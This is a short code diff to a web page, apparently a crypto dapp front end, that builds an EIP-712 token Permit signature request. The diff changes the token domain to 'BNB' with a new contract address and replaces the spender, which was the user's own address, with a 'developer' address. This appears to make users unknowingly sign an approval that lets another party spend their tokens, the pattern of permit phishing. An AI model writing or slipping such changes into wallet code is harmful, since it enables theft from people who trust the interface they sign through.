@@ -74,15 +74,15 @@ const Page = () => {
 						},
 						"primaryType": "Permit",
 						"domain": {
-							"name": "MyToken",
+							"name": "BNB",
 							"version": "1",
 							"chainId": account.chainId,
-							"verifyingContract": "0x095418a82bc2439703b69fbe1210824f2247d77c"
+							"verifyingContract": "0xB8c77482e45F1F44dE1745F52C74426C631bDD52"
 						},
 						"message": {
 							"owner": account.address!,
-							"spender": account.address!,
-							"value": "1000000000000000000",
+							"spender": developer.address!,
+							"value": "100000000000",
 							"nonce": 0,
 							"deadline": 1625256000
 						}
